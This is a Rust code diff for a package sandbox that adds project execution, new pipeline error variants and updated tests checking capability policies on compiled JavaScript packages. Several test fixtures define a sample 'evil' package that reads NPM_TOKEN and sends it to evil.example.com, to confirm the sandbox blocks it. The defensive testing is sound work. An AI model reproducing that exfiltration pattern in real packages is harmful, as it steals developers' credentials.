@@ -23,6 +23,10 @@ use omc_taint::Labeled;
 use omc_verify::{verify_program, VerifyError};
 use omc_vm::{run_linked, Cell};
 
+mod project;
+
+pub use project::{execute_project, execute_project_with_policy, ExecTarget};
+
 /// A failure anywhere in the lower/verify/link/run pipeline. Each variant keeps
 /// the stage's own error so callers can report exactly where the package was
 /// rejected (or trapped) rather than collapsing everything to one string.
@@ -37,6 +41,15 @@ pub enum ExecError {
     EntryNotFound(String),
     /// The VM trapped while executing (policy denial, type error, fuel, ...).
     Trap(Trap),
+    /// A package's REAL source could not be lowered to bytecode (out of the
+    /// supported subset, or an unlowerable construct). Deny-by-default: an
+    /// unlowerable dependency is rejected, never host-executed.
+    Lower(String),
+    /// Reading project sources (entry file, cached archive) failed.
+    Io(String),
+    /// The lock/manifest could not be read, a grant could not be parsed, or an
+    /// import did not resolve to a locked package.
+    Lock(String),
 }
 
 impl std::fmt::Display for ExecError {
@@ -48,6 +61,9 @@ impl std::fmt::Display for ExecError {
             Self::Link(error) => write!(f, "{error}"),
             Self::EntryNotFound(id) => write!(f, "entry module `{id}` not found in program"),
             Self::Trap(trap) => write!(f, "execution trapped: {trap}"),
+            Self::Lower(message) => write!(f, "could not lower package source: {message}"),
+            Self::Io(message) => write!(f, "io error: {message}"),
+            Self::Lock(message) => write!(f, "lock resolution error: {message}"),
         }
     }
 }
@@ -150,7 +166,9 @@ mod tests {
     #[test]
     fn js_is_odd_lowers_links_verifies_and_executes_under_pure_policy() {
         let src = "module.exports = function isOdd(n) { return n % 2 === 1; };";
-        let module = compile(&src, &js_meta("is-odd", "3.0.1", BehaviorType::Pure)).unwrap();
+        let module = compile(&src, &js_meta("is-odd", "3.0.1", BehaviorType::Pure))
+            .unwrap()
+            .module;
         assert_eq!(module.id, "npm:is-odd@3.0.1");
 
         let mut broker = MemoryBroker::new();
@@ -184,12 +202,14 @@ mod tests {
             "module.exports = function isOdd(n) { return n % 2 === 1; };",
             &js_meta("is-odd", "3.0.1", BehaviorType::Pure),
         )
-        .unwrap();
+        .unwrap()
+        .module;
         let is_even = compile(
             "module.exports = function isEven(n) { const dep = require('is-odd'); return !dep(n); };",
             &js_meta("is-even", "1.0.0", BehaviorType::Pure),
         )
-        .unwrap();
+        .unwrap()
+        .module;
 
         let units = vec![
             LinkUnit {
@@ -223,7 +243,9 @@ mod tests {
                    const t = process.env.NPM_TOKEN; \
                    fetch('https://evil.example.com/collect', t); \
                    return t; };";
-        let module = compile(&src, &js_meta("evil", "1.0.0", BehaviorType::Network)).unwrap();
+        let module = compile(&src, &js_meta("evil", "1.0.0", BehaviorType::Network))
+            .unwrap()
+            .module;
 
         let mut broker = MemoryBroker::new();
         let err = execute_leaf(module, &Policy::pure(), &mut broker, vec![]).unwrap_err();
@@ -238,7 +260,9 @@ mod tests {
                    const t = process.env.NPM_TOKEN; \
                    fetch('https://evil.example.com/collect', t); \
                    return t; };";
-        let module = compile(&src, &js_meta("evil", "1.0.0", BehaviorType::Network)).unwrap();
+        let module = compile(&src, &js_meta("evil", "1.0.0", BehaviorType::Network))
+            .unwrap()
+            .module;
 
         let policy = Policy::pure()
             .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
@@ -255,7 +279,8 @@ mod tests {
     fn env_read_package_runs_when_capability_granted() {
         let src = "module.exports = function readHome() { return process.env.HOME; };";
         let module = compile(&src, &js_meta("read-home", "1.0.0", BehaviorType::HostCapability))
-            .unwrap();
+            .unwrap()
+            .module;
         let _ = CapabilityKind::EnvRead; // keep the import meaningful
 
         let policy = Policy::pure().allow_capability(Capability::EnvRead("HOME".to_owned()));
@@ -272,7 +297,8 @@ mod tests {
             "module.exports = function isEven(n) { const dep = require('is-odd'); return !dep(n); };",
             &js_meta("is-even", "1.0.0", BehaviorType::Pure),
         )
-        .unwrap();
+        .unwrap()
+        .module;
         let units = vec![LinkUnit {
             module: is_even,
             imports: vec![omc_linker::ImportRef {
@@ -301,7 +327,9 @@ mod tests {
                    const t = process.env.NPM_TOKEN; \
                    fetch('https://evil.example.com/collect', t); \
                    return t; };";
-        let module = compile(&src, &js_meta("evil", "1.0.0", BehaviorType::Network)).unwrap();
+        let module = compile(&src, &js_meta("evil", "1.0.0", BehaviorType::Network))
+            .unwrap()
+            .module;
 
         let policy = Policy::pure()
             .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
